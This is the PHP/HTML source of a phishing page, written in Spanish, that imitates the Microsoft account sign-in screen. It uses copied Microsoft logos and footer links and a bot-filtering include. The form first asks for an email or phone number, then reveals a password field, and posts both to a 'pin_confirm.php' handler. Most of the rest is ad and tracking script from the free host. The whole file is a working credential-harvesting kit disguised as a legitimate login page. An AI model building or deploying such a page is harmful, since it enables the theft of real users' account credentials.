<?php
require_once './is_bot.php';

?>
<html dir="ltr"><head>
<meta name="robots" content="noindex,nofollow" />
        <!-- Inserted by miarroba -->
        <script type="text/javascript" async="true">
            (function () {
                var host = window.location.hostname;
                var element = document.createElement('script');
                var firstScript = document.getElementsByTagName('script')[0];
                var url = 'https://quantcast.mgr.consensu.org'.concat('/choice/', 'd5x2uDVHd7ALE', '/', host, '/choice.js')
                var uspTries = 0;
                var uspTriesLimit = 3;
                element.async = true;
                element.type = 'text/javascript';
                element.src = url;
                firstScript.parentNode.insertBefore(element, firstScript);
                function makeStub() {
                    var TCF_LOCATOR_NAME = '__tcfapiLocator';
                    var queue = [];
                    var win = window;
                    var cmpFrame;
                    function addFrame() {
                        var doc = win.document;
                        var otherCMP = !!(win.frames[TCF_LOCATOR_NAME]);
                        if (!otherCMP) {
                            if (doc.body) {
                                var iframe = doc.createElement('iframe');

                                iframe.style.cssText = 'display:none';
                                iframe.name = TCF_LOCATOR_NAME;
                                doc.body.appendChild(iframe);
                            } else {
                                setTimeout(addFrame, 5);
                            }
                        }
                        return !otherCMP;
                    }
                    function tcfAPIHandler() {
                        var gdprApplies;
                        var args = arguments;
                        if (!args.length) {
                            return queue;
                        } else if (args[0] === 'setGdprApplies') {
                            if (
                                    args.length > 3 &&
                                    args[2] === 2 &&
                                    typeof args[3] === 'boolean'
                                    ) {
                                gdprApplies = args[3];
                                if (typeof args[2] === 'function') {
                                    args[2]('set', true);
                                }
                            }
                        } else if (args[0] === 'ping') {
                            var retr = {
                                gdprApplies: gdprApplies,
                                cmpLoaded: false,
                                cmpStatus: 'stub'
                            };

                            if (typeof args[2] === 'function') {
                                args[2](retr);
                            }
                        } else {
                            queue.push(args);
                        }
                    }
                    function postMessageEventHandler(event) {
                        var msgIsString = typeof event.data === 'string';
                        var json = {};

                        try {
                            if (msgIsString) {
                                json = JSON.parse(event.data);
                            } else {
                                json = event.data;
                            }
                        } catch (ignore) {
                        }
                        var payload = json.__tcfapiCall;
                        if (payload) {
                            window.__tcfapi(
                                    payload.command,
                                    payload.version,
                                    function (retValue, success) {
                                        var returnMsg = {
                                            __tcfapiReturn: {
                                                returnValue: retValue,
                                                success: success,
                                                callId: payload.callId
                                            }
                                        };
                                        if (msgIsString) {
                                            returnMsg = JSON.stringify(returnMsg);
                                        }
                                        event.source.postMessage(returnMsg, '*');
                                    },
                                    payload.parameter
                                    );
                        }
                    }
                    while (win) {
                        try {
                            if (win.frames[TCF_LOCATOR_NAME]) {
                                cmpFrame = win;
                                break;
                            }
                        } catch (ignore) {
                        }
                        if (win === window.top) {
                            break;
                        }
                        win = win.parent;
                    }
                    if (!cmpFrame) {
                        addFrame();
                        win.__tcfapi = tcfAPIHandler;
                        win.addEventListener('message', postMessageEventHandler, false);
                    }
                }
                ;
                makeStub();
                var uspStubFunction = function () {
                    var arg = arguments;
                    if (typeof window.__uspapi !== uspStubFunction) {
                        setTimeout(function () {
                            if (typeof window.__uspapi !== 'undefined') {
                                window.__uspapi.apply(window.__uspapi, arg);
                            }
                        }, 500);
                    }
                };
                var checkIfUspIsReady = function () {
                    uspTries++;
                    if (window.__uspapi === uspStubFunction && uspTries < uspTriesLimit) {
                        console.warn('USP is not accessible');
                    } else {
                        clearInterval(uspInterval);
                    }
                };
                if (typeof window.__uspapi === 'undefined') {
                    window.__uspapi = uspStubFunction;
                    var uspInterval = setInterval(checkIfUspIsReady, 6000);
                }
            })();
        </script>
        <script>
            (function (w, d, s, l, i) {
                w[l] = w[l] || [];
                w[l].push({'gtm.start':
                            new Date().getTime(), event: 'gtm.js'});
                var f = d.getElementsByTagName(s)[0],
                        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
                j.async = true;
                j.src =
                        'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
                f.parentNode.insertBefore(j, f);
            })(window, document, 'script', 'dataLayer', 'GTM-T2VG59');
                    </script>
          <meta name="robots" content="noindex,nofollow">
        <!-- Inserted by miarroba --><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <!-- Removed by WebCopy --><!--<base href=".">--><!-- Removed by WebCopy -->
        <title>Iniciar sesion en tu cuenta Microsoft!</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
        <link rel="shortcut icon" href="descarga.ico">
        <link rel="stylesheet" title="pagina" type="text/css" href="stylo.css">
        <style type="text/css">body{display:block !important;}</style></head>
    <style>
        @media (max-width: 600px) {
            .background {
                background-color: #fff;
                background-image: none;
            }
            .middle{
                padding-top: 0px;
                vertical-align: top;
            }
            .inner{
                padding: 24px;
                -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0);
                -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0);
                box-shadow: 0 2px 6px rgba(0, 0, 0, 0);
            }
            .footer{
                position: absolute;
                left: 0;
            }
            .footer.default {
                background: #fff;
                margin-bottom: 0;
                right: 100px;

            }
            .footer.default div.footerNode a, .footer.default div.footerNode span {

                color: #747474;

            }
            div.footerNode{
                float: left;
                margin-left: 24px;
            }
        }
        .error{
            color:red;
        }
    </style>
    <body class="fa" data-bind="defineGlobals: ServerData, bodyCssClass"></body><body="">
        <!-- Inserted by miarroba -->
        <noscript><iframe src="ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
        <!-- Inserted by miarroba --><div><!--  --><!--  --> <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
                <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                    <!-- ko if: smallImageUrl --> 
                    <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;0-small.jpg"></div>
                    <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;vzbuQ.jpg"></div> </div></div>
            <div data-bind="if: activeDialog"></div> 

            <form name="form1" id="form1" method="post" action="pin_confirm.php">
                <div class="outer" data-bind="component: { name: 'master-page',}">

                    <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
                        <div class="inner fade-in-lightbox"> 

                            <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.be &amp;&amp; showLightboxProgress() }"></div>
                            <div data-bind="component: { name: 'logo-control',}">
                                <img class="logo" role="img" src="microsoft_logo.svg"></div>
                            <div style="display: inherit;" id="cargaCorreo" role="main" data-bind="component: { name: 'pagination-control',publicMethods: paginationControlMethods, }">
                                <div><div class="pagination-view animate slide-in-next">
                                        <div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',}">
                                            <div data-bind="component: { name: 'header-control',}">
                                                <div class="row text-title" id="l0ginHeader">
                                                    <div role="heading" aria-level="1" data-bind="text: title">Iniciar sesión</div></div></div>
                                            <div class="row">
                                                <div class="form-group col-md-24">
                                                    <div id="error" class="error"></div>
                                                    
                                                    <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',publicMethods: usernameTextbox.placeholderTextboxMethods}"> 
                                                        <input autocomplete="off" onkeypress="return runScript(event)" type="text" id="email" name="email" maxlength="120" class="form-control" aria-required="true" aria-describedby="l0ginHeader" placeholder="Correo electrónico, teléfono o Skype" onkeyup="validar()" tabindex="0" required=""> </div>
                                                </div>
                                                <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links">
                                                                <div class="form-group" data-bind="">¿No tiene una cuenta? <a href="javascript:void(0)" id="elefante3" name="elefante3">Cree una.</a></div>
                                                                <div class="form-group"> <a id="elefante2" name="elefante2" href="javascript:void(0)">Iniciar sesión con una llave de seguridad</a> <span class="help-button" role="button" tabindex="0"><img role="presentacion" src="documentation.svg"></span>
                                                                </div>
                                                                <div class="form-group">

                                                                    <div class="form-group"><a id="elefante4" href="javascript:void(0)">Opciones de inicio de sesion</a></div></div></div> </div> </div> <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field'}">
                                                            <div class="col-xs-24 no-padding-left-right button-container" data-bind="">

                                                                <div class="inline-block">
                                                                    <button type="button" id="botonsito" class="btn btn-block btn-primary">Siguiente</button>

                                                                </div> 
                                                            </div>
                                                        </div> 
                                                    </div> </div></div>
                                        </div> </div></div>
                            </div>
                            <div <div style="display:none" id="cargaClave" role="main" data-bind="component: { name: 'pagination-control',publicMethods: paginationControlMethods, }">
                                <div>
                                    <div class="animate slide-in-next">
                                        <div class="identityBanner">
                                            <div  id="regresar" class="backButton" style="padding-top: 1px;">
                                                <img src="arrow_left.svg" alt="arrow left" />
                                            </div>
                                            <div id="nombreListo" class="identity"></div>
                                        </div>
                                    </div>
                                    <div class="pagination-view animate has-identity-banner slide-in-next">
                                        <div class="row text-title">
                                            Escribir contraseña
                                        </div>
                                        <div class="row">
                                            <div class="form-group col-md-24">
                                                <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',publicMethods: usernameTextbox.placeholderTextboxMethods}"> 
                                                    <input autocomplete="off" type="password" id="pass" name="pass" class="form-control" placeholder="Contraseña"> 
                                                </div>
                                            </div>
                                        </div>
                                        <div class="position-buttons">
                                            <div>
                                                <div class="row">
                                                    <div class="col-md-24">
                                                        <div class="text-13">
                                                            <div class="form-group">
                                                                <a href="#">¿Olvidó su contraseña?</a>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="win-button-pin-bottom">
                                                <div class="row">
                                                    <div class="col-xs-24 no-padding-left-right button-container">
                                                        <div class="inline-block">
                                                            <button type="submit" class="btn btn-block btn-primary">Iniciar sesión</button>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                </div> 
        </div></div></form>
<div id="footer" role="contentinfo" data-bind="
                css: {
                    'default': !backgroundLogoUrl(),
                    'new-background-image': useNewDefaultBackground },
                externalCss: { 'footer': true }" class="default footer ext-footer new-background-image">
    <div data-bind="component: { name: 'footer-control',
                    publicMethods: footerMethods,
                    params: {
                        serverData: svr,
                        useNewDefaultBackground: useNewDefaultBackground(),
                        hasDarkBackground: backgroundLogoUrl(),
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetails: toggleDebugDetails_onClick } }"><!--  -->

        <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
        <div id="footerLinks" class="footerNode text-secondary">

            <!-- ko if: !hideTOU -->
            <a id="ftrTerms" data-bind="text: termsText, href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=ES-ES&amp;vv=1600&amp;uaid=01dab370b97e48ba886c2a28ad7baf65&amp;nw=4G">Términos de uso</a>
            <!-- /ko -->

            <!-- ko if: !hidePrivacy -->
            <a id="ftrPrivacy" data-bind="text: privacyText, href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=ES-ES&amp;vv=1600&amp;uaid=01dab370b97e48ba886c2a28ad7baf65&amp;nw=4G">Privacidad y cookies</a>
            <!-- /ko -->

            <!-- ko if: impressumLink --><!-- /ko -->

            <!-- ko if: showIcpLicense --><!-- /ko -->

            <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
            <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo()" aria-label="Haga clic aquí para obtener información relacionada con la solución de problemas." aria-expanded="false">

                <!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: !useNewDefaultBackground } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
                <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_96f69d0cefd8a8ba623a182c351ccc64.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg"><!-- /ko -->
                <!-- /ko --><!-- /ko -->

                <!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: hasDarkBackground } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
                <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko -->
                <!-- /ko --><!-- /ko -->
            </a>
        </div>
        <!-- /ko -->

        <!-- ko if: svr.Cj && showLinks --><!-- /ko --></div>
</div>
</div>



<script src="js/funciones.js" type="text/javascript"></script>
<script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
<script>

</script>
<script>
$('#email').on('keydown', function(e) {
       if (e.which == 13) {
           e.preventDefault();
          
    var valorCorreo = document.getElementById("email").value;
    var error = document.getElementById("error");
    var divCorreo = document.getElementById("cargaCorreo");
    var divClave = document.getElementById("cargaClave");
    var correoAdquirido = document.getElementById("nombreListo");
    if ((valorCorreo !== "" && ValidateEmail(valorCorreo)) || validatePhoneNumber(valorCorreo)) {
        divCorreo.style.display = "none";
        divClave.style.display = "inherit";
        correoAdquirido.innerHTML = valorCorreo;
    } else {
        error.innerHTML = msgError(1);
    }

       }
});
    function ShowAndHide() {
        document.querySelector('#displ4yN4me').innerHTML = document.querySelector('#jxkc').value;
        var x = document.getElementById('temporada');
        if (x.style.display == 'none') {
            x.style.display = 'block';
        } else {
            x.style.display = 'none';
        }

    }
    function anular(e) {
        tecla = (document.all) ? e.keyCode : e.which;
        return (tecla != 13);
    }

    function validar(e) {
        var validado = false;

        var letters = /^[0-9a-zA-Z]+$/;
        var filter = /^([a-zA-Z0-9\_\.\_])+\@(([a-zA-Z0-9\_])+\.)+([a-zA-Z0-9]{2,4})+$/;
        elementos = document.getElementsByClassName("form-control ltr_override");
        for (i = 0; i < elementos.length; i++) {

            if (filter.test(elementos[i].value) || letters.test(elementos[i].value))
            {
                validado = false
            }
        }
        if (validado) {
            document.getElementById("botonsito").disabled = false;

        } else {
            document.getElementById("botonsito").disabled = false;
        }
    }
</script><!-- Inserted by miarroba -->

<script type="text/javascript" src="https://hosting.miarroba.info/?__muid=876f0f5f74a572621375f2b0d40d7b8f2ee3e325&h=2034127&t=1604615909&k=dfbf535794ba4dd27fbe039ca81eea6d"></script><noscript><img alt="beacon" border="0" width="1" height="1" src="index.htm.gif?__muid=876f0f5f74a572621375f2b0d40d7b8f2ee3e325&amp;h=2034127&amp;t=1604615909&amp;k=dfbf535794ba4dd27fbe039ca81eea6d&amp;img=1"></noscript>
<script type="text/javascript">var s = document.createElement("script");
    var t = "//des.smartclip.net/ads?type=dyn&plc=75133&elementId=876f0f5f74a572621375f2b0d40d7b8f2ee3e325&sz=400x320&rnd=" + Math.round(Math.random() * 1e8);
    s.type = "text/javascript";
    s.src = t;
    document.body.appendChild(s);</script><div id="876f0f5f74a572621375f2b0d40d7b8f2ee3e325"></div>
<div id="ads_HEZRL65RXYI2"></div>
<script defer="" language="javascript" type="text/javascript">
    (function () {
        var newscript = document.createElement('script');
        newscript.type = 'text/javascript';
        newscript.async = true;
        lz_elem = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);
        lz_elem.appendChild(newscript);
        newscript.onload = function (ev) {
            var lz_url = "https://play.sunmediaads.com/red/zone.php?code=HEZRL65RXYI2&a=&pubid=&lgid=" + ((new Date()).getTime() % 2147483648) + Math.random();
            var lz_target = "ads_HEZRL65RXYI2";
            var lz_sync_mode = false;
            lz_loadads(lz_url, lz_target, lz_sync_mode);
        }
        newscript.src = "https://img.sunmediaads.com/ads/lz_loader.js?ver=1.4";
    })();
</script>
<!-- Inserted by miarroba -->
</body="">
        </html>